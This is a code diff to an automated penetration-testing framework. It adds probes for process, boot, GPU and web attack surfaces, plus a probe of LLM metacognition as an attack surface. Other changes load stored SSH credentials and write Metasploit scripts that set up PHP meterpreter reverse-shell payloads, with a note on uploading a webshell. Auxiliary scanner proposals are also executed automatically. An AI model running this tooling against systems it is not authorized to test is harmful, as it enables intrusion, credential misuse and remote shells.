@@ -283,6 +283,23 @@ def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
         if interactive_present or host_present or data_present or container_present or ai_present or iot_present:
             return 1.0
         return 0.0
+    if inst_name in {"process_probe", "boot_probe"}:
+        # High coherence once SSH is available (HO-03 realized) or host domain present
+        return 1.0 if host_present else 0.3
+    if inst_name == "gpu_probe":
+        # Always run network phase; SSH phase conditional on host access
+        # High coherence for AI/ML targets (likely have GPUs), moderate for all others
+        if ai_present:
+            return 1.0
+        if host_present:
+            return 0.7
+        # Network scan for exposed compute APIs is always worth running
+        return 0.4
+    if inst_name == "cognitive_probe":
+        # Only meaningful when target is an AI/LLM endpoint
+        if ai_present:
+            return 1.0
+        return 0.1
     return 1.0
 
 
@@ -1077,6 +1094,90 @@ def detect_instruments() -> dict:
         available=cred_reuse_path.exists(),
     )
 
+    # Structured data fetcher — pulls JSON/JSONL/XML/YAML from web endpoints.
+    # Domain agnostic: probes wellknown structured endpoints on any HTTP target.
+    # Wavelength covers structured-data exposure wickets WB-30..WB-40.
+    # Available whenever skg.sensors.struct_fetch can be imported (stdlib only).
+    try:
+        from skg.sensors import struct_fetch as _sf_check  # noqa: F401
+        _struct_fetch_ok = True
+    except ImportError:
+        _struct_fetch_ok = False
+    instruments["web_struct_fetch"] = Instrument(
+        name="web_struct_fetch",
+        description=(
+            "Structured endpoint fetch — JSON/JSONL/XML/YAML from OpenAPI, "
+            "config, metrics, debug, health, sitemap endpoints"
+        ),
+        wavelength=[
+            "WB-30", "WB-31", "WB-32", "WB-33", "WB-34",
+            "WB-35", "WB-36", "WB-37", "WB-38", "WB-39", "WB-40",
+            "WB-01", "WB-02", "WB-06",
+        ],
+        cost=1.5,
+        available=_struct_fetch_ok,
+    )
+
+    instruments["process_probe"] = Instrument(
+        name="process_probe",
+        description=(
+            "Process exploit surface — ptrace_scope, user namespaces, eBPF, ASLR, "
+            "SUID inventory, executable stack, shared memory, cron writability"
+        ),
+        wavelength=[
+            "PR-01", "PR-02", "PR-03", "PR-04", "PR-05",
+            "PR-06", "PR-07", "PR-08", "PR-09", "PR-10",
+            # overlaps with host wickets (SUID → privesc → HO-14)
+            "HO-14",
+        ],
+        cost=2.0,
+        available=True,  # requires SSH creds at exec time; always potentially schedulable
+    )
+
+    instruments["boot_probe"] = Instrument(
+        name="boot_probe",
+        description=(
+            "Boot/firmware attack surface — UEFI mode, Secure Boot, EFI var writability, "
+            "TPM presence, GRUB protection, kernel lockdown, cmdline flags"
+        ),
+        wavelength=[
+            "BT-01", "BT-02", "BT-03", "BT-04", "BT-05",
+            "BT-06", "BT-07", "BT-08", "BT-09",
+        ],
+        cost=2.0,
+        available=True,
+    )
+
+    instruments["gpu_probe"] = Instrument(
+        name="gpu_probe",
+        description=(
+            "GPU / compute attack surface — IOMMU absence, OpenCL JIT, Vulkan API, "
+            "GPU memory persistence, MPS context isolation, network compute APIs, "
+            "GPU process injection (non-driver: compute API exploit surface)"
+        ),
+        wavelength=[
+            "GP-01", "GP-02", "GP-03", "GP-04", "GP-05",
+            "GP-06", "GP-07", "GP-08", "GP-09", "GP-10",
+        ],
+        cost=2.5,
+        available=True,
+    )
+
+    instruments["cognitive_probe"] = Instrument(
+        name="cognitive_probe",
+        description=(
+            "AI/LLM metacognition attack surface — confidence calibration, "
+            "error detection, known-unknown discrimination, strategy revision, "
+            "uncertainty propagation, overconfidence on novel domains (MC-01..MC-08)"
+        ),
+        wavelength=[
+            "MC-01", "MC-02", "MC-03", "MC-04",
+            "MC-05", "MC-06", "MC-07", "MC-08",
+        ],
+        cost=3.0,
+        available=True,
+    )
+
     return instruments
 
 
@@ -1332,6 +1433,21 @@ def execute_instrument(instrument: Instrument, target: dict,
         result = _exec_binary_analysis(ip, target, run_id, out_dir, result)
     elif instrument.name == "cred_reuse":
         result = _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=authorized)
+
+    elif instrument.name == "web_struct_fetch":
+        result = _exec_web_struct_fetch(ip, target, run_id, out_dir, result)
+
+    elif instrument.name == "process_probe":
+        result = _exec_process_probe(ip, target, run_id, out_dir, result)
+
+    elif instrument.name == "boot_probe":
+        result = _exec_boot_probe(ip, target, run_id, out_dir, result)
+
+    elif instrument.name == "gpu_probe":
+        result = _exec_gpu_probe(ip, target, run_id, out_dir, result)
+
+    elif instrument.name == "cognitive_probe":
+        result = _exec_cognitive_probe(ip, target, run_id, out_dir, result)
 
     # Count field state after
     states_after = load_wicket_states(ip)
@@ -1808,6 +1924,305 @@ def _exec_auth_scanner(ip, target, run_id, out_dir, result):
     return result
 
 
+def _exec_process_probe(ip, target, run_id, out_dir, result):
+    """
+    Process exploit surface — ptrace_scope, user namespaces, eBPF,
+    ASLR, SUID, executable stack, shared memory, cron writability.
+
+    Requires SSH access to the target. Reads credentials from the
+    credential store (tries msfdb then local store).
+    """
+    sys.path.insert(0, str(REPO_ROOT))
+    try:
+        from skg.sensors.process_probe import probe_process_surface
+    except Exception as e:
+        result["error"] = f"process_probe import failed: {e}"
+        return result
+
+    creds = _load_ssh_creds_for_ip(ip)
+    if not creds:
+        result["error"] = "No SSH credentials available for process_probe"
+        result["skipped"] = True
+        return result
+
+    events_file = out_dir / f"process_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+    try:
+        events = probe_process_surface(
+            target_ip=ip,
+            ssh_user=creds.get("user", "root"),
+            ssh_key=creds.get("key_path"),
+            ssh_password=creds.get("password"),
+            out_file=events_file,
+        )
+        result["success"] = True
+        result["events"] = len(events)
+        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
+        if events_file.exists():
+            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def _exec_boot_probe(ip, target, run_id, out_dir, result):
+    """
+    Boot/firmware attack surface — UEFI mode, Secure Boot, EFI variables,
+    TPM, GRUB protection, kernel lockdown, cmdline flags.
+
+    Requires SSH access. Boot surface is only meaningful on Linux targets.
+    """
+    sys.path.insert(0, str(REPO_ROOT))
+    try:
+        from skg.sensors.boot_probe import probe_boot_surface
+    except Exception as e:
+        result["error"] = f"boot_probe import failed: {e}"
+        return result
+
+    # Only run on Linux hosts
+    os_guess = (target.get("os") or "").lower()
+    if "windows" in os_guess:
+        result["skipped"] = True
+        result["error"] = "boot_probe: Windows target — use separate Windows boot audit"
+        return result
+
+    creds = _load_ssh_creds_for_ip(ip)
+    if not creds:
+        result["error"] = "No SSH credentials available for boot_probe"
+        result["skipped"] = True
+        return result
+
+    events_file = out_dir / f"boot_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+    try:
+        events = probe_boot_surface(
+            target_ip=ip,
+            ssh_user=creds.get("user", "root"),
+            ssh_key=creds.get("key_path"),
+            ssh_password=creds.get("password"),
+            out_file=events_file,
+        )
+        result["success"] = True
+        result["events"] = len(events)
+        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
+        if events_file.exists():
+            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def _exec_gpu_probe(ip, target, run_id, out_dir, result):
+    """
+    GPU / compute attack surface.
+
+    Two-phase:
+    1. Network phase (no auth required): probe compute API ports
+    2. SSH phase (if creds available): check device files, IOMMU, OpenCL ICD,
+       MPS server, GPU process list, driver version → CVE match
+
+    The network phase runs unconditionally — GPU compute APIs exposed to the
+    network are a first-class attack vector regardless of SSH access.
+    """
+    sys.path.insert(0, str(REPO_ROOT))
+    try:
+        from skg.sensors.gpu_probe import probe_gpu_surface
+    except Exception as e:
+        result["error"] = f"gpu_probe import failed: {e}"
+        return result
+
+    creds = _load_ssh_creds_for_ip(ip)  # may be None — network phase still runs
+    events_file = out_dir / f"gpu_probe_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+    try:
+        events = probe_gpu_surface(
+            target_ip=ip,
+            ssh_user=(creds or {}).get("user", "root"),
+            ssh_key=(creds or {}).get("key_path"),
+            ssh_password=(creds or {}).get("password"),
+            out_file=events_file,
+        )
+        result["success"] = True
+        result["events"] = len(events)
+        result["realized"] = sum(1 for e in events if e.get("payload",{}).get("realized"))
+        if events_file.exists():
+            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+            (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def _exec_cognitive_probe(ip, target, run_id, out_dir, result):
+    """
+    AI/LLM metacognition attack surface.
+
+    Probes LLM subjects (configured in skg_config.yaml under cognitive_probe:)
+    for MC-01..MC-08 metacognitive preconditions:
+      - Confidence calibration (ECE)
+      - Spontaneous/directed error detection
+      - Known-unknown discrimination
+      - Strategy revision on failure
+      - Confidence updating on evidence
+      - Uncertainty propagation
+      - Overconfidence on novel domains
+
+    Only runs for AI-domain targets. Requires:
+      - cognitive_probe.subject_endpoint set in target config, OR
+      - target has ai_present=True and an endpoint accessible on known LLM ports
+    """
+    sys.path.insert(0, str(REPO_ROOT))
+
+    # Resolve subject config from target or global config
+    ai_cfg = target.get("cognitive_probe") or {}
+    if not ai_cfg:
+        # Try global config
+        try:
+            import yaml
+            global_cfg_path = REPO_ROOT / "config" / "skg_config.yaml"
+            if global_cfg_path.exists():
+                gcfg = yaml.safe_load(global_cfg_path.read_text())
+                ai_cfg = gcfg.get("cognitive_probe") or {}
+        except Exception:
+            pass
+
+    if not ai_cfg:
+        result["error"] = "cognitive_probe: no config found (set cognitive_probe: in skg_config.yaml or target)"
+        return result
+
+    # Inject target IP if api_base not explicitly set
+    if "api_base" not in ai_cfg:
+        port = ai_cfg.get("port", 11434)
+        ai_cfg["api_base"] = f"http://{ip}:{port}"
+
+    probe_set = ai_cfg.get("probe_set")
+    if not probe_set:
+        # Use bundled default catalog probes
+        default_probe = REPO_ROOT / "skg-metacognition-toolchain" / "contracts" / "catalogs" / "default_probes.yaml"
+        if default_probe.exists():
+            ai_cfg["probe_set"] = str(default_probe)
+        else:
+            result["error"] = "cognitive_probe: no probe_set configured and no default probes found"
+            return result
+
+    ai_cfg.setdefault("collect_interval_s", 0)
+    ai_cfg.setdefault("subject_id", ai_cfg.get("model", ip))
+    ai_cfg.setdefault("workload_id", f"ai::{ip}")
+    ai_cfg.setdefault("domain", "metacognition")
+
+    try:
+        from skg.sensors.cognitive_sensor import CognitiveSensor
+        sensor = CognitiveSensor(cfg=ai_cfg, events_dir=out_dir)
+        out_files = sensor.run()
+        result["success"] = True
+        result["events_files"] = out_files
+        result["events"] = len(out_files)
+        # Copy events to global EVENTS_DIR
+        for fp in out_files:
+            src = Path(fp)
+            if src.exists():
+                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+                (EVENTS_DIR / src.name).write_text(src.read_text())
+    except Exception as e:
+        result["error"] = f"cognitive_probe: {e}"
+    return result
+
+
+def _load_ssh_creds_for_ip(ip: str) -> Optional[dict]:
+    """
+    Load SSH credentials for a target IP from the credential store.
+    Returns dict with 'user', 'password'/'key_path' or None.
+    """
+    cred_file = Path("/var/lib/skg/credentials.jsonl")
+    if not cred_file.exists():
+        return None
+    for line in cred_file.read_text().splitlines():
+        try:
+            cred = json.loads(line)
+            if cred.get("target_ip") == ip and cred.get("protocol") in ("ssh", "winrm"):
+                result: dict = {"user": cred.get("username", "root")}
+                if cred.get("key_path"):
+                    result["key_path"] = cred["key_path"]
+                elif cred.get("password"):
+                    result["password"] = cred["password"]
+                return result
+        except Exception:
+            continue
+    return None
+
+
+def _exec_web_struct_fetch(ip, target, run_id, out_dir, result):
+    """
+    Structured data fetcher — probes wellknown JSON/JSONL/XML/YAML endpoints.
+
+    Domain agnostic: works against any HTTP target.  Emits WB-30..WB-40 wickets
+    for OpenAPI schemas, config exposure, debug endpoints, credentials in
+    structured responses, internal IP leakage, XMLRPC, version disclosure, etc.
+
+    This instrument is directed by the same gravity physics as every other
+    instrument: it is selected when the WB-30..WB-40 wavelength has unknown
+    wickets.  No special-casing required.
+    """
+    from skg.sensors.struct_fetch import fetch_and_ingest
+
+    # Determine base URLs to probe.  Supports http/https and custom ports.
+    services = target.get("services", [])
+    http_ports: list[tuple[str, int]] = []
+    for svc in services:
+        port = svc.get("port", 0)
+        name = (svc.get("service") or svc.get("name") or "").lower()
+        if port in (80, 8080, 8000, 8008, 8009, 3000) or "http" in name:
+            http_ports.append(("http", port))
+        elif port in (443, 8443, 9443) or "https" in name:
+            http_ports.append(("https", port))
+    # Fallback: always try port 80
+    if not http_ports:
+        http_ports = [("http", 80)]
+
+    workload_id = f"web::{ip}"
+    events_file = out_dir / f"gravity_struct_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
+    all_events: list[dict] = []
+
+    for scheme, port in http_ports[:3]:  # cap at 3 ports
+        base_url = f"{scheme}://{ip}" if port in (80, 443) else f"{scheme}://{ip}:{port}"
+        try:
+            events, probed = fetch_and_ingest(
+                base_url=base_url,
+                target_ip=ip,
+                workload_id=workload_id,
+                run_id=run_id,
+            )
+            all_events.extend(events)
+            if probed:
+                print(f"    [STRUCT] {ip}:{port} — probed {len(probed)} endpoints, "
+                      f"{len(events)} events")
+        except Exception as exc:
+            print(f"    [STRUCT] {ip}:{port} — error: {exc}")
+
+    if not all_events:
+        result["success"] = True
+        result["events"] = 0
+        return result
+
+    with open(events_file, "w") as fh:
+        for ev in all_events:
+            fh.write(json.dumps(ev) + "\n")
+
+    r = sum(1 for e in all_events if e.get("payload", {}).get("status") == "realized")
+    b = sum(1 for e in all_events if e.get("payload", {}).get("status") == "blocked")
+    print(f"    [STRUCT] {ip}: {len(all_events)} events ({r}R {b}B)")
+
+    result["success"] = True
+    result["events"] = len(all_events)
+    result["events_file"] = str(events_file)
+    try:
+        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())
+    except Exception:
+        pass
+    _project_gravity_events(events_file, run_id, result)
+    return result
+
+
 def _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=False):
     """
     Credential reuse instrument.
@@ -2139,7 +2554,11 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
             f"set LHOST {LHOST}",
             f"set LPORT {LPORT}",
             f"set ExitOnSession false",
-            f"run -j",
+            f"run -z",
+            f"",
+            f"sleep 30",
+            f"sessions -l",
+            f"exit -y",
             f"",
             f"# Deliver payload manually:",
             f"# URL: {cmdi_url}",
@@ -2158,7 +2577,12 @@ def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorize
             f"set PAYLOAD php/meterpreter/reverse_tcp",
             f"set LHOST {LHOST}",
             f"set LPORT {LPORT}",
-            f"run -j",
+            f"set ExitOnSession false",
+            f"run -z",
+            f"",
+            f"sleep 30",
+            f"sessions -l",
+            f"exit -y",
             f"",
             f"# Upload webshell to: http://{ip}:{port}/vulnerabilities/upload/",
         ]
@@ -4327,6 +4751,41 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                       if states.get(w, {}).get("status") == "blocked")
         n_folds  = len(fold_manager.all()) if fold_manager else 0
 
+        # ── Kuramoto order parameter R per sphere ─────────────────────────
+        # Computes R(sphere) for each domain covered by this target.
+        # R ∈ [0,1]: 0 = maximally incoherent (all unknown), 1 = fully synchronized.
+        # Used to modulate instrument selection: low R → amplify potential.
+        R_per_sphere: dict = {}
+        try:
+            from skg.topology.kuramoto import build_oscillators, _order_parameter_per_sphere
+            osc = build_oscillators(EVENTS_DIR, INTERP_DIR)
+            # Filter to oscillators relevant to this target
+            target_osc = [o for o in osc
+                          if hasattr(o, 'wicket_id') and any(
+                              o.wicket_id in applicable
+                          )] if osc else []
+            if not target_osc:
+                # Fall back to all oscillators with sphere matching this target's domains
+                target_spheres = set()
+                for d in effective_domains:
+                    if d == "web": target_spheres.add("web")
+                    elif d == "host": target_spheres.add("host")
+                    elif d == "data": target_spheres.add("data")
+                    elif d == "container": target_spheres.add("container")
+                    elif d == "ad_lateral": target_spheres.add("ad_lateral")
+                target_osc = [o for o in osc if getattr(o, 'sphere', '') in target_spheres]
+            if target_osc:
+                R_per_sphere = _order_parameter_per_sphere(target_osc)
+        except Exception:
+            R_per_sphere = {}
+
+        # ── Paper 4 L(F) field functional ─────────────────────────────────
+        L_F = 0.0
+        try:
+            L_F = _kernel.L_field_functional(ip)
+        except Exception:
+            pass
+
         landscape.append({
             "ip": ip,
             "entropy":           E,
@@ -4344,6 +4803,8 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
             "services":          target.get("services", []),
             "target":            target,
             "fold_manager":      fold_manager,
+            "R_per_sphere":      R_per_sphere,   # Kuramoto order parameter
+            "L_F":               L_F,             # Paper 4 field functional
         })
 
     # Sort by entropy — follow the gradient
@@ -4413,6 +4874,41 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                 potential *= (1.0 + p_boost / 10.0)
             else:
                 potential += p_boost
+
+            # ── Kuramoto order parameter R — phase coherence bonus ──────────
+            # Paper 4 / Work 3 open question: does fiber-driven gravity converge
+            # to Kuramoto equations? We implement the coupling here:
+            # When R(sphere) is high (oscillators synchronized → mostly realized),
+            # instruments covering that sphere get a bonus (exploitation phase).
+            # When R is low (incoherent → many unknowns), priority stays high.
+            # Effect: R acts as a phase indicator — high R means the sphere is
+            # "resolved enough" to chain exploits; low R means more observation.
+            # Φ_effective *= (1 + β × (1 - R_sphere)) where β = 0.25
+            try:
+                r_per_sphere = t.get("R_per_sphere", {})
+                if r_per_sphere:
+                    beta = 0.25
+                    # Find the sphere(s) this instrument primarily covers
+                    wave = getattr(inst, "wavelength", []) or []
+                    sphere_prefixes = {
+                        "WB-": "web", "HO-": "host", "DA-": "data",
+                        "CE-": "container", "LA-": "lateral", "BI-": "binary",
+                        "AI-": "ai_target", "AD-": "ad_lateral",
+                    }
+                    inst_spheres: set = set()
+                    for wid in wave:
+                        for prefix, sphere in sphere_prefixes.items():
+                            if wid.startswith(prefix):
+                                inst_spheres.add(sphere)
+                    if inst_spheres:
+                        # Mean R across covered spheres
+                        r_vals = [r_per_sphere.get(s, 0.5) for s in inst_spheres]
+                        r_mean = sum(r_vals) / len(r_vals)
+                        # Low R → high unknown density → amplify potential
+                        # High R → well-observed sphere → slight reduction
+                        potential *= (1.0 + beta * (1.0 - r_mean))
+            except Exception:
+                pass
 
             has_nmap_history = bool(glob.glob(str(DISCOVERY_DIR / f"gravity_nmap_{ip}_*.ndjson")))
             has_cve_history = bool(glob.glob(str(CVE_DIR / f"cve_events_{ip}_*.ndjson")))
@@ -4625,6 +5121,81 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                 except Exception as exc:
                     print(f"    [WARN] follow-on {_fo.get('path_id','?')} failed: {exc}")
 
+        # ── Auxiliary module proposals (service-specific scanners) ─────────
+        # After every instrument sweep, check the realized wicket set against
+        # AUXILIARY_MAP and generate observation proposals for reachable services.
+        try:
+            from exploit_dispatch import AUXILIARY_MAP, create_action as _ea_create
+            from skg.forge.proposals import create_action as _fa_create
+            _refreshed_states = load_wicket_states(ip)
+            _realized_set = {
+                w for w, s in _refreshed_states.items()
+                if isinstance(s, dict) and s.get("status") == "realized"
+            }
+            _services = {svc.get("port", 0) for svc in t.get("services", [])}
+
+            for _aux_path, _candidates in AUXILIARY_MAP.items():
+                for _cand in _candidates:
+                    _req = set(_cand.get("requires", []))
+                    if not _req.issubset(_realized_set):
+                        continue
+                    # Don't re-propose if already pending for this target+path
+                    _dup = any(
+                        _p.get("status") == "pending" and
+                        ip in json.dumps(_p) and _aux_path in json.dumps(_p)
+                        for _pf in (SKG_STATE_DIR / "proposals").glob("*.json")
+                        for _p in [json.loads(_pf.read_text())]
+                        if True
+                    )
+                    if _dup:
+                        break
+                    # Determine port from options
+                    _port_s = str(_cand.get("options", {}).get("RPORT", "0"))
+                    try:
+                        _port = int(_port_s)
+                    except Exception:
+                        _port = 0
+                    # Build RC file
+                    _lhost = _get_lhost()
+                    _opts = {
+                        k: v.replace("{target_ip}", ip).replace("{lhost}", _lhost).replace("{port}", str(_port))
+                        for k, v in _cand.get("options", {}).items()
+                    }
+                    _rc_lines = [
+                        f"# SKG auxiliary — {_aux_path}",
+                        f"# Target: {ip}:{_port}",
+                        f"use {_cand['module']}",
+                    ]
+                    for _k, _v in _opts.items():
+                        _rc_lines.append(f"set {_k} {_v}")
+                    _rc_lines += ["run", "", "exit"]
+                    _rc_path = out_path / f"aux_{_aux_path}_{ip.replace('.','_')}_{run_id[:8]}.rc"
+                    _rc_path.write_text("\n".join(_rc_lines))
+                    _fa_create(
+                        domain=_aux_path.split("_")[0],
+                        description=f"{_cand['module']} against {ip}:{_port} — {_cand.get('notes','')}",
+                        attack_surface=f"{ip}:{_port}",
+                        hosts=[ip],
+                        category="runtime_observation",
+                        evidence=f"Aux path {_aux_path}: requires {sorted(_req)} all realized.",
+                        action={
+                            "instrument": "msf",
+                            "module": _cand["module"],
+                            "module_class": _cand.get("class", "auxiliary"),
+                            "target_ip": ip,
+                            "port": _port,
+                            "options": _opts,
+                            "confidence": _cand.get("confidence", 0.70),
+                            "rc_file": str(_rc_path),
+                            "dispatch": {"kind": "msf_rc_script",
+                                         "command_hint": f"msfconsole -q -r {_rc_path}"},
+                        },
+                    )
+                    print(f"    [AUX] Proposed {_cand['module']} for {ip} ({_aux_path})")
+                    break  # one candidate per path per cycle
+        except Exception as _aux_exc:
+            pass  # auxiliary dispatch is best-effort
+
         # Surface per-instrument failures so the operator sees what actually
         # happened, even if another instrument succeeded.
         for _name, _res in concurrent_results.items():
@@ -4785,7 +5356,19 @@ def gravity_field_cycle(surface_path: str, out_dir: str,
                             c.get("module_class", "").lower() == "auxiliary"
                             for c in _module_candidates
                         )
-                        _sync_exec = _p.get("category") == "runtime_observation" or _all_aux
+                        # Sync-execute only passive/auxiliary proposals.
+                        # Exploit-category proposals (reverse shells, RCEs, EternalBlue)
+                        # must run async so the session stays open — and operators can
+                        # review the log. Never sync-execute real exploit modules.
+                        _module = _action.get("module", "")
+                        _is_exploit_module = (
+                            _module.startswith("exploit/") and
+                            _module != "exploit/multi/handler"
+                        )
+                        _sync_exec = (
+                            ((_p.get("category") == "runtime_observation" or _all_aux)
+                             and not _is_exploit_module)
+                        )
                         print(f"  [AUTO-EXEC] Triggered proposal {_pid} for {_tip}")
                         if _rc and Path(_rc).exists():
                             import subprocess as _sp
